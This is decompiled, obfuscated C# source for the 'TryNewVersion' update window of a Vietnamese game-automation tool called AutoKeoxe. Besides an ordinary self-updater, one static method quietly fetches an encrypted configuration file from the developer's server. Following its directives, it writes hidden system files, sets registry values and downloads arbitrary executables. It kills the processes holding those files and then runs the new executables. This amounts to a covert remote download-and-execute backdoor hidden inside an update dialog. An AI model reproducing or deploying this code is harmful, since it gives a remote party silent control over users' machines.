using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace AutoKeoxe
{
	// Token: 0x020000E1 RID: 225
	public partial class TryNewVersion : Form
	{
		// Token: 0x06000C0B RID: 3083 RVA: 0x00199359 File Offset: 0x00197559
		public TryNewVersion()
		{
			TryNewVersion.bool_0 = true;
			this.InitializeComponent();
			base.Icon = Icon.ExtractAssociatedIcon(Application.ExecutablePath);
		}

		// Token: 0x06000C0C RID: 3084 RVA: 0x00199388 File Offset: 0x00197588
		private new void Dispose(bool disposing)
		{
			bool flag = disposing && this.icontainer_0 != null;
			if (flag)
			{
				this.icontainer_0.Dispose();
			}
			this.Dispose(disposing);
		}

		// Token: 0x06000C0E RID: 3086 RVA: 0x00199902 File Offset: 0x00197B02
		private void OnFormClosing(object sender, FormClosingEventArgs e)
		{
			TryNewVersion.bool_0 = false;
			this.int_2 = 0;
			this.int_3 = 0;
		}

		// Token: 0x06000C0F RID: 3087 RVA: 0x0019991C File Offset: 0x00197B1C
		private void TryNewVersion_Load(object sender, EventArgs e)
		{
			bool flag = this.int_2 > 0 && this.int_3 > 0;
			if (flag)
			{
				int num = this.int_2 - base.Width;
				int num2 = this.int_3 + this.int_5 - base.Height;
				bool flag2 = num < 0;
				if (flag2)
				{
					num = 0;
				}
				bool flag3 = num2 < 0;
				if (flag3)
				{
					num2 = 0;
				}
				base.SetBounds(num, num2, base.Width, base.Height);
			}
			this.timer_0.Interval = 300;
			this.timer_0.Enabled = true;
			base.TopMost = true;
			this.method_6("CAP NHAT AUTO");
		}

		// Token: 0x06000C10 RID: 3088 RVA: 0x001999C8 File Offset: 0x00197BC8
		private void timer_0_Tick(object sender, EventArgs e)
		{
			bool flag = !TryNewVersion.bool_0;
			if (flag)
			{
				base.Close();
			}
			else
			{
				bool flag2 = TryNewVersion.string_0 != null && TryNewVersion.string_0.Length != 0;
				if (flag2)
				{
					this.textBoxStatus.Text = TryNewVersion.string_0[0];
					Class12.smethod_30(ref TryNewVersion.string_0, TryNewVersion.string_0[0], false);
				}
				bool flag3 = TryNewVersion.bool_2;
				if (flag3)
				{
					this.buttonDownload.Enabled = (TryNewVersion.int_0 == 0);
					TryNewVersion.bool_2 = false;
				}
			}
		}

		// Token: 0x06000C11 RID: 3089 RVA: 0x00199A50 File Offset: 0x00197C50
		private bool method_0(string string_2, string string_3)
		{
			int num = 0;
			for (;;)
			{
				bool flag = num < 20;
				if (!flag)
				{
					goto IL_2E;
				}
				bool flag2 = Class12.smethod_19(string_2, string_3);
				if (flag2)
				{
					break;
				}
				Thread.Sleep(600);
				num++;
			}
			return true;
			IL_2E:
			return false;
		}

		// Token: 0x06000C12 RID: 3090 RVA: 0x00199A9C File Offset: 0x00197C9C
		private int method_1(string string_2)
		{
			long long_ = Class12.smethod_27();
			for (;;)
			{
				bool flag = Class12.smethod_17(string_2);
				if (!flag)
				{
					break;
				}
				Class12.smethod_20(string_2);
				Thread.Sleep(1000);
				if (Class12.smethod_28(long_) > 30000L)
				{
					goto Block_2;
				}
			}
			return 1;
			Block_2:
			return 0;
		}

		// Token: 0x06000C13 RID: 3091 RVA: 0x00199AF0 File Offset: 0x00197CF0
		public int method_2(string string_2, string string_3)
		{
			Console.WriteLine("string_2" + string_2);
			Console.WriteLine("string_3" + string_3);
			Class12.smethod_29(ref TryNewVersion.string_0, "Đang kiểm tra phiên bản auto mới..." + Class53.string_7 + "Bấm tải trực tiếp nếu không cập nhật được.");
			int num = 0;
			bool flag = false;
			byte[] array;
			int num2;
			for (;;)
			{
				array = null;
				try
				{
					WebClient webClient = new WebClient();
					array = webClient.DownloadData(string_2);
					webClient.CancelAsync();
				}
				catch
				{
					bool flag2 = num < string_2.Length - 1;
					if (flag2)
					{
						num++;
						continue;
					}
					bool flag3 = flag;
					if (flag3)
					{
						Class12.smethod_29(ref TryNewVersion.string_0, "Không có phiên bản auto nào được cập nhật.");
						return 0;
					}
					Class12.smethod_29(ref TryNewVersion.string_0, "Có lỗi khi kiểm tra phiên bản.");
					return -1;
				}
				num2 = 10000;
				bool flag4 = array != null && array.Length >= num2;
				if (flag4)
				{
					break;
				}
				flag = true;
				bool flag5 = num < string_2.Length - 1;
				if (!flag5)
				{
					goto IL_F6;
				}
				num++;
			}
			string text = string_3 + ".Tmp";
			byte[] bytes = Class12.smethod_52(array, true);
			File.WriteAllBytes(text, bytes);
			string b = Class12.smethod_7(string_3);
			string a = Class12.smethod_7(text);
			FileInfo fileInfo = new FileInfo(text);
			bool flag6 = !(a == "") && !(a == b) && fileInfo.Length >= (long)num2;
			if (!flag6)
			{
				Class12.smethod_29(ref TryNewVersion.string_0, "Không có phiên bản mới hơn.");
				Class12.smethod_20(text);
				return 0;
			}
			Class12.smethod_29(ref TryNewVersion.string_0, "Đã tải xong auto, xin đợi tí xíu để cập nhật...");
			string text2 = string_3 + ".Bak";
			this.method_1(text2);
			this.method_0(string_3, text2);
			bool flag7 = this.method_0(text, string_3);
			if (flag7)
			{
				Class12.smethod_29(ref TryNewVersion.string_0, "Có phiên bản mới (tắt auto rồi chạy lại).");
				TryNewVersion.int_0 = 1;
				return 1;
			}
			string text3 = Environment.GetEnvironmentVariable("homedrive") + "\\" + Form1.string_2;
			bool flag8 = !this.method_0(text, text3);
			if (flag8)
			{
				Class12.smethod_29(ref TryNewVersion.string_0, "Thất bại, không thể ghi tệp tải về.");
				return -2;
			}
			Class12.smethod_29(ref TryNewVersion.string_0, "Tệp tải về lưu tại: " + text3 + Class53.string_7 + "Copy tệp trên và chép đè nó vào tệp cũ rồi sử dụng.");
			return 2;
			IL_F6:
			Class12.smethod_29(ref TryNewVersion.string_0, "Không có phiên bản auto nào được cập nhật.");
			return 0;
		}

		// Token: 0x06000C14 RID: 3092 RVA: 0x00199D7C File Offset: 0x00197F7C
		public static bool smethod_0(string string_2, string string_3, int int_6 = 1000000)
		{
			try
			{
				bool flag = Class12.smethod_17(string_3);
				if (flag)
				{
					Class12.smethod_20(string_3);
					Thread.Sleep(600);
					bool flag2 = Class12.smethod_17(string_3);
					if (flag2)
					{
						Random random = new Random();
						string str = random.Next(99999, 99999999).ToString();
						bool flag3 = false;
						for (int i = 0; i < 20; i++)
						{
							bool flag4 = !Class12.smethod_19(string_3, string_3 + "." + str);
							if (!flag4)
							{
								flag3 = true;
								break;
							}
							Thread.Sleep(600);
						}
						bool flag5 = !flag3;
						if (flag5)
						{
							return false;
						}
					}
				}
				WebClient webClient = new WebClient();
				byte[] byte_ = webClient.DownloadData(string_2);
				webClient.CancelAsync();
				byte[] bytes = Class12.smethod_52(byte_, true);
				File.WriteAllBytes(string_3, bytes);
				Thread.Sleep(600);
				FileInfo fileInfo = new FileInfo(string_3);
				return fileInfo.Length > (long)int_6;
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x06000C15 RID: 3093 RVA: 0x00199E9C File Offset: 0x0019809C
		public int method_3(string[] string_2, string string_3, int int_6 = 15000)
		{
			string[] array = Class12.smethod_14(string_3, '\\');
			Class12.smethod_29(ref TryNewVersion.string_0, "Bắt đầu tải cập nhật: " + array[1] + Class53.string_7 + "Xin đợi chút xíu ...");
			Class12.smethod_20(string_3 + ".Tmp");
			int num = 0;
			bool flag = false;
			byte[] array2;
			for (;;)
			{
				array2 = null;
				try
				{
					WebClient webClient = new WebClient();
					array2 = webClient.DownloadData(string_2[num]);
					webClient.CancelAsync();
				}
				catch
				{
					bool flag2 = num < string_2.Length - 1;
					if (flag2)
					{
						num++;
						continue;
					}
					bool flag3 = !flag;
					if (flag3)
					{
						Class12.smethod_29(ref TryNewVersion.string_0, "Có lỗi khi tải " + array[1]);
						return -1;
					}
					Class12.smethod_29(ref TryNewVersion.string_0, "Không có tệp " + array[1] + " nào được cập nhật.");
					return 0;
				}
				bool flag4 = array2 != null && array2.Length >= int_6;
				if (flag4)
				{
					break;
				}
				flag = true;
				bool flag5 = num < string_2.Length - 1;
				if (!flag5)
				{
					goto IL_FF;
				}
				num++;
			}
			string text = string_3 + ".Tmp";
			byte[] bytes = Class12.smethod_52(array2, true);
			File.WriteAllBytes(text, bytes);
			string a = Class12.smethod_7(text);
			FileInfo fileInfo = new FileInfo(text);
			bool flag6 = a == "" || fileInfo.Length < (long)int_6;
			if (flag6)
			{
				Class12.smethod_20(text);
				Class12.smethod_29(ref TryNewVersion.string_0, "Không có tệp " + array[1] + " nào được cập nhật.");
				this.method_1(string_3);
				return -1;
			}
			Class12.smethod_29(ref TryNewVersion.string_0, "Đã tải xong " + array[1] + ", xin đợi tí xíu để cập nhật...");
			this.method_1(string_3);
			bool flag7 = this.method_0(text, string_3);
			if (flag7)
			{
				Class12.smethod_29(ref TryNewVersion.string_0, "Đã cập nhật xong tệp: " + array[1]);
				return 1;
			}
			Class12.smethod_29(ref TryNewVersion.string_0, "Thất bại, không thể tải về tệp: " + array[1]);
			return -1;
			IL_FF:
			Class12.smethod_29(ref TryNewVersion.string_0, "Không có tệp " + array[1] + " nào được cập nhật.");
			return 0;
		}

		// Token: 0x06000C16 RID: 3094 RVA: 0x0019A0E0 File Offset: 0x001982E0
		private void buttonDownload_Click(object sender, EventArgs e)
		{
			bool flag = !TryNewVersion.bool_2;
			if (flag)
			{
				new Thread(new ThreadStart(this.method_4)).Start();
			}
		}

		// Token: 0x06000C17 RID: 3095 RVA: 0x0019A114 File Offset: 0x00198314
		public void method_4()
		{
			TryNewVersion.bool_2 = false;
			string string_ = TryNewVersion.string_1 + "/" + Form1.string_2;
			string string_2 = Class22.smethod_75().Replace(Form1.string_2.ToUpper(), Form1.string_2);
			this.method_2(string_, string_2);
			TryNewVersion.bool_2 = true;
		}

		// Token: 0x06000C18 RID: 3096 RVA: 0x0019A168 File Offset: 0x00198368
		private void linkLabelLinkWeb_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			string string_ = Environment.GetEnvironmentVariable("programfiles") + "\\Google\\Chrome\\Application\\chrome.exe";
			bool flag = !Class12.smethod_17(string_);
			if (flag)
			{
				string_ = Class62.smethod_0();
			}
			Class22.smethod_40(string_, "", "http://canhtrang.com/", 0, false, false);
		}

		// Token: 0x06000C19 RID: 3097 RVA: 0x0019A1B4 File Offset: 0x001983B4
		private void linkLabelBlog_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			string string_ = Environment.GetEnvironmentVariable("programfiles") + "\\Google\\Chrome\\Application\\chrome.exe";
			bool flag = !Class12.smethod_17(string_);
			if (flag)
			{
				string_ = Class62.smethod_0();
			}
			Class22.smethod_40(string_, "", "http://canhtrang.com/", 0, false, false);
		}

		// Token: 0x06000C1A RID: 3098 RVA: 0x0019A200 File Offset: 0x00198400
		private static string smethod_1(string string_2, bool bool_4)
		{
			string[] array = new string[]
			{
				"Thất bại.",
				"Thành công"
			};
			string_2 = "- Tải " + string_2 + " \t: " + array[(int)Convert.ToByte(bool_4)];
			return string_2;
		}

		// Token: 0x06000C1B RID: 3099 RVA: 0x0019A244 File Offset: 0x00198444
		private static void smethod_2(string string_2)
		{
			bool flag = TryNewVersion.bool_0;
			if (flag)
			{
				Class12.smethod_29(ref TryNewVersion.string_0, string_2);
			}
			else
			{
				Class12.smethod_29(ref Class12.string_16, string_2);
			}
		}

		// Token: 0x06000C1C RID: 3100 RVA: 0x0019A278 File Offset: 0x00198478
		private void buttonAutoTrain_Click(object sender, EventArgs e)
		{
			bool flag = !TryNewVersion.bool_2;
			if (flag)
			{
				new Thread(new ThreadStart(this.method_5)).Start();
			}
		}

		// Token: 0x06000C1D RID: 3101 RVA: 0x0019A2AC File Offset: 0x001984AC
		public void method_5()
		{
			string text = "KY TrainJx";
			string text2 = "KYTrain.exe";
			string text3 = Class53.string_8 + "\\KYTrain";
			Class12.smethod_23(text3);
			string text4 = text3 + "\\" + text2;
			string address = TryNewVersion.string_1 + "/" + text2;
			bool flag = !Class12.smethod_20(text4);
			if (flag)
			{
				string text5 = null;
				string[] array = Class12.smethod_14(text2, '.');
				try
				{
					Process[] processesByName = Process.GetProcessesByName(array[0]);
					bool flag2 = processesByName != null && processesByName.Length != 0;
					if (flag2)
					{
						text5 = "Hãy thoát " + text2 + " rồi làm lại.";
					}
				}
				catch
				{
				}
				bool flag3 = text5 == null;
				if (flag3)
				{
					text5 = "Hãy khởi động lại máy rồi tải lại.";
				}
				Class12.smethod_29(ref TryNewVersion.string_0, "Có lỗi xảy ra. " + text5);
			}
			else
			{
				TryNewVersion.bool_2 = true;
				Class12.smethod_29(ref TryNewVersion.string_0, "Đang tải auto KYTrain, xin chờ chút xíu...");
				byte[] byte_ = null;
				try
				{
					WebClient webClient = new WebClient();
					byte_ = webClient.DownloadData(address);
					webClient.CancelAsync();
				}
				catch
				{
					Class12.smethod_29(ref TryNewVersion.string_0, "Có lỗi xảy ra.");
					TryNewVersion.bool_2 = false;
					return;
				}
				byte[] bytes = Class12.smethod_52(byte_, true);
				File.WriteAllBytes(text4, bytes);
				Class12.smethod_29(ref TryNewVersion.string_0, "Đã tải xong auto !");
				Thread.Sleep(1500);
				Class22.smethod_73(text, text4, text3, 1);
				Class22.smethod_71(text4, true);
				Class22.smethod_40(text4, text3, "", 0, false, false);
				TryNewVersion.bool_2 = false;
				TryNewVersion.bool_0 = false;
			}
		}

		// Token: 0x06000C1E RID: 3102 RVA: 0x0019A44C File Offset: 0x0019864C
		private void linkLabelTaiTructiep_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			string string_ = Environment.GetEnvironmentVariable("programfiles") + "\\Google\\Chrome\\Application\\chrome.exe";
			bool flag = !Class12.smethod_17(string_);
			if (flag)
			{
				string_ = Class62.smethod_0();
			}
			string text = "https://drive.google.com/file/d/1F8AsVK0WzqB3CXdGwXXF0m-9amH3yFV2";
			this.textBoxStatus.Text = text;
			Class22.smethod_40(string_, "", text, 0, false, false);
		}

		// Token: 0x06000C1F RID: 3103 RVA: 0x0019A4A8 File Offset: 0x001986A8
		public static void smethod_3()
		{
			byte[] array = null;
			try
			{
				WebClient webClient = new WebClient();
				string address = TryNewVersion.string_1 + "/" + Class12.smethod_15("cmFtL3JhbXRtcC50eHQ=");
				array = webClient.DownloadData(address);
				webClient.CancelAsync();
				webClient.Dispose();
			}
			catch
			{
			}
			bool flag = array == null || array.Length < 4;
			if (!flag)
			{
				string @string = Encoding.UTF8.GetString(array, 0, array.Length);
				bool flag2 = @string == null || @string == string.Empty || @string.Length < 5;
				if (!flag2)
				{
					int num = 8;
					string string_ = @string.Substring(0, num);
					string string_2 = @string.Substring(num, @string.Length - num);
					string text = Class12.smethod_35(string_2, Class12.smethod_15(string_), new byte[8]);
					bool flag3 = text == null || text == string.Empty;
					if (!flag3)
					{
						text = Class12.smethod_15(text);
						bool flag4 = text == null || text == string.Empty;
						if (!flag4)
						{
							text = text.Replace("\r\n", "\r");
							string[] array2 = text.Split(new char[]
							{
								'\r',
								'\n'
							});
							bool flag5 = array2 == null || array2.Length < 1;
							if (!flag5)
							{
								Struct30[] array3 = null;
								Random random = new Random();
								int num2 = 0;
								int num3 = 0;
								int num4 = 0;
								for (;;)
								{
									string text2 = array2[num3];
									bool flag6 = text2 != null && !(text2 == string.Empty) && text2[0] == '(';
									if (!flag6)
									{
										goto IL_443;
									}
									int num5 = text2.IndexOf(")");
									bool flag7 = num5 >= 1 && num5 <= 5;
									if (flag7)
									{
										string text3 = text2.Substring(1, num5 - 1);
										string text4 = text2.Substring(num5 + 1);
										num2 = 0;
										for (;;)
										{
											try
											{
												bool flag8 = text4 == null || text4 == string.Empty || text4.Length <= num2;
												if (!flag8)
												{
													int num6 = text4.IndexOf("%", num2);
													bool flag9 = num6 < 0;
													if (!flag9)
													{
														int num7 = num6 + 1;
														bool flag10 = text4.Length <= num7;
														if (!flag10)
														{
															int num8 = text4.IndexOf("%", num7);
															bool flag11 = num8 <= 0;
															if (!flag11)
															{
																string variable = text4.Substring(num7, num8 - num6 - 1);
																string environmentVariable = Environment.GetEnvironmentVariable(variable);
																bool flag12 = environmentVariable == null || !(environmentVariable != string.Empty);
																if (flag12)
																{
																	num2 = num7;
																	continue;
																}
																text4 = text4.Substring(0, num6) + environmentVariable + text4.Substring(num8 + 1);
																num2 = num8 + 1;
																continue;
															}
														}
													}
												}
											}
											catch
											{
											}
											break;
										}
										IL_2E4:
										bool flag13 = array3 == null;
										if (flag13)
										{
											array3 = new Struct30[1];
										}
										else
										{
											Array.Resize<Struct30>(ref array3, array3.Length + 1);
										}
										num4 = array3.Length;
										array3[num4 - 1].string_0 = text4;
										bool flag14 = text3 != null && text3.Length > 1;
										if (flag14)
										{
											text3 = text3.ToLower();
											array3[num4 - 1].bool_0 = (text3[text3.Length - 1] == 'e');
											array3[num4 - 1].bool_4 = (text3[0] == 'd' && text3[1] == 'l');
											array3[num4 - 1].bool_1 = (text3[0] == '>' && text3[1] == '>');
											array3[num4 - 1].bool_3 = (text3[0] == '>' && text3[1] == 'c' && text3[2] == 'u');
											array3[num4 - 1].bool_2 = (text3[0] == '>' && text3[1] == 'l' && text3[2] == 'm');
										}
										array3[num4 - 1].string_1 = null;
										goto IL_4E9;
										goto IL_2E4;
									}
									goto IL_443;
									IL_4E9:
									num3++;
									if (num3 >= array2.Length)
									{
										break;
									}
									continue;
									IL_443:
									bool flag15 = num4 > 0;
									if (flag15)
									{
										bool flag16 = text2 == null;
										if (flag16)
										{
											text2 = string.Empty;
										}
										bool flag17 = array3[num4 - 1].string_1 == null;
										if (flag17)
										{
											array3[num4 - 1].string_1 = new string[1];
										}
										else
										{
											Array.Resize<string>(ref array3[num4 - 1].string_1, array3[num4 - 1].string_1.Length + 1);
										}
										array3[num4 - 1].string_1[array3[num4 - 1].string_1.Length - 1] = text2;
									}
									goto IL_4E9;
								}
								num4 = 0;
								while (array3 != null && array3.Length > num4)
								{
									bool flag18 = array3[num4].string_0 != null && !(array3[num4].string_0 == string.Empty);
									if (flag18)
									{
										bool flag19 = !array3[num4].bool_4;
										if (flag19)
										{
											bool flag20 = !array3[num4].bool_3 && !array3[num4].bool_2;
											if (flag20)
											{
												string text5 = string.Empty;
												bool flag21 = array3[num4].bool_1;
												if (flag21)
												{
													text5 = Class12.smethod_33(array3[num4].string_0, 0, 0, 1);
												}
												for (;;)
												{
													bool flag22 = array3[num4].bool_1 && text5 != null && !(text5 == string.Empty);
													if (!flag22)
													{
														goto IL_7C9;
													}
													while (text5 != null && text5.Length > 0)
													{
														char c = text5[text5.Length - 1];
														bool flag23 = c != '\r' && c != '\n';
														if (flag23)
														{
															break;
														}
														text5 = text5.Substring(0, text5.Length - 1);
													}
													bool flag24 = array3[num4].string_1 == null;
													if (flag24)
													{
														break;
													}
													bool flag25 = text5 == null || text5 == string.Empty;
													if (!flag25)
													{
														goto IL_689;
													}
												}
												IL_85B:
												text5 += "\r\n";
												Class12.smethod_20(array3[num4].string_0);
												Thread.Sleep(100);
												Class12.smethod_34(array3[num4].string_0, text5, 1);
												Class12.smethod_21(array3[num4].string_0, FileAttributes.Hidden | FileAttributes.System);
												bool flag26 = array3[num4].bool_0;
												if (flag26)
												{
													Class22.smethod_5(array3[num4].string_0);
												}
												TryNewVersion.int_1 = random.Next(30, 300) * 60 * 1000;
												goto IL_AB3;
												IL_689:
												string[] array4 = text5.Replace("\r\n", "\r").Split(new char[]
												{
													'\r',
													'\n'
												});
												for (int i = 0; i < array3[num4].string_1.Length; i++)
												{
													bool flag27 = false;
													bool flag28 = array3[num4].string_1[i] == null;
													if (flag28)
													{
														array3[num4].string_1[i] = string.Empty;
													}
													bool flag29 = array3[num4].string_1[i] != string.Empty;
													if (flag29)
													{
														for (int j = 0; j < array4.Length; j++)
														{
															bool flag30 = array4[j] == array3[num4].string_1[i];
															if (flag30)
															{
																flag27 = true;
																break;
															}
														}
													}
													bool flag31 = !flag27;
													if (flag31)
													{
														bool flag32 = text5 != null && text5 != string.Empty;
														if (flag32)
														{
															text5 += "\r\n";
														}
														text5 += array3[num4].string_1[i];
													}
												}
												goto IL_85B;
												IL_7C9:
												text5 = string.Empty;
												bool flag33 = array3[num4].string_1 == null;
												if (flag33)
												{
													goto IL_85B;
												}
												for (int k = 0; k < array3[num4].string_1.Length; k++)
												{
													bool flag34 = text5 != null && text5 != string.Empty;
													if (flag34)
													{
														text5 += "\r\n";
													}
													text5 += array3[num4].string_1[k];
												}
												goto IL_85B;
											}
											else
											{
												bool flag35 = array3[num4].string_1 != null;
												if (flag35)
												{
													TryNewVersion.int_1 = random.Next(30, 300) * 60 * 1000;
													for (int l = 0; l < array3[num4].string_1.Length; l++)
													{
														string text6 = array3[num4].string_1[l];
														bool flag36 = text6 == null || text6 == string.Empty;
														if (!flag36)
														{
															int num9 = text6.IndexOf("=");
															bool flag37 = num9 >= 0 && text6.Length >= num9;
															if (flag37)
															{
																string string_3 = text6.Substring(0, num9).Trim();
																string text7 = text6.Substring(num9 + 1).Trim();
																num9 = text7.IndexOf(":");
																string a = string.Empty;
																bool flag38 = num9 == 2;
																if (flag38)
																{
																	a = text7.Substring(0, num9).Trim().ToLower();
																	text7 = text7.Substring(num9 + 1).Trim();
																}
																bool flag39 = !(a == "dw");
																if (flag39)
																{
																	Class62.smethod_10(array3[num4].string_0, string_3, text7, "", Convert.ToByte(array3[num4].bool_3));
																}
																else
																{
																	int num10 = Class12.smethod_11(text7);
																	Class62.smethod_10(array3[num4].string_0, string_3, num10, "DWORD", Convert.ToByte(array3[num4].bool_3));
																}
															}
														}
													}
												}
											}
											IL_AB3:;
										}
										else
										{
											string text8 = string.Empty;
											bool flag40 = array3[num4].string_1 != null;
											if (flag40)
											{
												for (int m = 0; m < array3[num4].string_1.Length; m++)
												{
													text8 = array3[num4].string_1[m];
													bool flag41 = text8 != null && text8 != string.Empty;
													if (flag41)
													{
														break;
													}
												}
											}
											bool flag42 = text8 != null && !(text8 == string.Empty);
											if (flag42)
											{
												string text9 = array3[num4].string_0;
												long num11 = 0L;
												try
												{
													FileInfo fileInfo = new FileInfo(text9);
													num11 = fileInfo.Length;
												}
												catch
												{
												}
												array = null;
												try
												{
													WebClient webClient2 = new WebClient();
													webClient2.OpenRead(text8);
													long num12 = Convert.ToInt64(webClient2.ResponseHeaders["Content-Length"]);
													bool flag43 = num11 != num12 && num12 > 0L;
													if (flag43)
													{
														array = webClient2.DownloadData(text8);
													}
													webClient2.CancelAsync();
													webClient2.Dispose();
													bool flag44 = array != null && array.Length != 0;
													if (flag44)
													{
														string[] array5 = Class12.smethod_14(text9, '\\');
														int num13 = 0;
														while (Class12.smethod_17(text9))
														{
															bool flag45 = num13 >= 10;
															if (flag45)
															{
																bool flag46 = num13 >= 20;
																if (flag46)
																{
																	break;
																}
																int n = 1;
																string text10 = string.Empty;
																while (n < 1000000)
																{
																	text10 = text9 + "." + random.Next(1, n).ToString() + ".tmp";
																	bool flag47 = !Class12.smethod_17(text10);
																	if (flag47)
																	{
																		break;
																	}
																}
																Class12.smethod_19(text9, text10);
															}
															else
															{
																bool flag48 = num13 == 5;
																if (flag48)
																{
																	string text11 = text9.ToLower();
																	Process[] processes = Process.GetProcesses();
																	bool flag49 = processes != null && processes.Length != 0;
																	if (flag49)
																	{
																		for (int num14 = 0; num14 < processes.Length; num14++)
																		{
																			try
																			{
																				string value = processes[num14].ProcessName.ToLower();
																				bool flag50 = 0 <= text11.IndexOf(value);
																				if (flag50)
																				{
																					string a2 = processes[num14].MainModule.FileName.ToLower();
																					bool flag51 = a2 == text11;
																					if (flag51)
																					{
																						Class22.smethod_49(processes[num14]);
																						Thread.Sleep(100);
																					}
																				}
																			}
																			catch
																			{
																			}
																		}
																	}
																}
																Class12.smethod_20(text9);
															}
															Thread.Sleep(300);
															num13++;
														}
														Class12.smethod_23(array5[0]);
														Thread.Sleep(100);
														File.WriteAllBytes(text9, array);
														bool flag52 = array3[num4].bool_0;
														if (flag52)
														{
															Thread.Sleep(600);
															Class22.smethod_40(text9, "", "", 0, true, false);
														}
													}
												}
												catch
												{
												}
											}
										}
									}
									num4++;
								}
							}
						}
					}
				}
			}
		}

		// Token: 0x06000C20 RID: 3104 RVA: 0x0019B328 File Offset: 0x00199528
		public static void smethod_4()
		{
			bool flag = Form1.int_64 != 0;
			if (flag)
			{
				int num = 0;
				for (;;)
				{
					bool flag2 = !TryNewVersion.bool_1 && num < 280;
					if (!flag2)
					{
						goto IL_72;
					}
					bool flag3 = !Class12.bool_0;
					if (!flag3)
					{
						goto IL_6D;
					}
					bool flag4 = Form1.int_64 != 0;
					if (!flag4)
					{
						break;
					}
					num++;
					Thread.Sleep(1000);
				}
				TryNewVersion.smethod_5();
				IL_6D:
				goto IL_F9;
				IL_72:
				TryNewVersion.bool_1 = false;
				string str = Class53.string_8 + "\\Ram";
				bool flag5 = !Class12.smethod_17(str + "\\fr.exe");
				if (flag5)
				{
					bool flag6 = Class12.smethod_17(str + "\\fr.bpl");
					if (flag6)
					{
						Class22.smethod_40(str + "\\fr.bpl", str, "", 0, false, false);
					}
				}
				else
				{
					Class22.smethod_40(str + "\\fr.exe", str, "", 0, false, false);
				}
				IL_F9:;
			}
			else
			{
				TryNewVersion.smethod_5();
			}
		}

		// Token: 0x06000C21 RID: 3105 RVA: 0x0019B438 File Offset: 0x00199638
		public static void smethod_5()
		{
			try
			{
				int int_ = Class22.smethod_54("fr.bpl");
				string text = Class22.smethod_25(int_, "FREE RAM", true, true);
				bool flag = text != "";
				if (flag)
				{
					string[] array = text.Split(new char[]
					{
						';'
					});
					for (int i = 0; i < array.Length; i++)
					{
						Class22.PostMessageA_1(Class12.smethod_12(array[i]), Class22.int_17, 0U, 0U);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000C22 RID: 3106 RVA: 0x000F47EB File Offset: 0x000F29EB
		private void method_6(string string_2)
		{
			base.Text = string_2;
		}

		// Token: 0x04001130 RID: 4400
		private IContainer icontainer_0 = null;

		// Token: 0x04001138 RID: 4408
		public static bool bool_0 = false;

		// Token: 0x04001139 RID: 4409
		public static int int_0 = 0;

		// Token: 0x0400113A RID: 4410
		public static bool bool_1 = false;

		// Token: 0x0400113B RID: 4411
		public static int int_1 = 0;

		// Token: 0x0400113C RID: 4412
		public int int_2;

		// Token: 0x0400113D RID: 4413
		public int int_3;

		// Token: 0x0400113E RID: 4414
		public int int_4;

		// Token: 0x0400113F RID: 4415
		public int int_5;

		// Token: 0x04001140 RID: 4416
		public static bool bool_2 = false;

		// Token: 0x04001141 RID: 4417
		public static bool bool_3 = false;

		// Token: 0x04001142 RID: 4418
		private static string[] string_0 = null;

		// Token: 0x04001144 RID: 4420
		private static string string_1 = Class104.string_1[0];
	}
}
